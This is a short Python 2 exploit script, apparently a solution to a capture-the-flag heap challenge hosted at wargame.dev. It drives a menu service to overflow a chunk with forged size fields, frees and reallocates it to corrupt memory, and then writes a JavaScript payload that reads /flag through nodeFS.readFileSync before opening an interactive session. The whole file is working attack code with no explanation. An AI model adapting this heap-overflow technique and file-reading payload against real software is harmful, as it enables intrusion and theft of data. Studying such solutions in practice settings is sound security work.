from socket import *
from struct import *
import telnetlib


PI = lambda x: pack('<I', x)

def rd(t):
    r = ''
    while t not in r:
        c = s.recv(1)
        if not c:
            break

        r += c

    return r



def alloc():
    s.send('1\n')
    return rd('> \n')

def write_data(index, data):
    s.send('2\n')
    rd('index> \n')
    s.send('%d\n' % index)
    rd('data> \n')
    s.send('%s\n' % data)
    return rd('> \n')

def delete(index):
    s.send('3\n')
    rd('index> \n')
    s.send('%d\n' % index)
    return rd('> \n')

if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('wargame.dev', 9004))

    print rd('> \n')
    for _ in range(3):
        alloc()

    chunk = 'a'*0x40 + PI(0x58) + PI(0x4a)
    write_data(0, chunk)

    delete(1)
    alloc()

    print write_data(1, PI(13))
    jscode = "console.log(nodeFS['readFileSync']('/flag').toString());\x00"
    print write_data(0, jscode)


    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
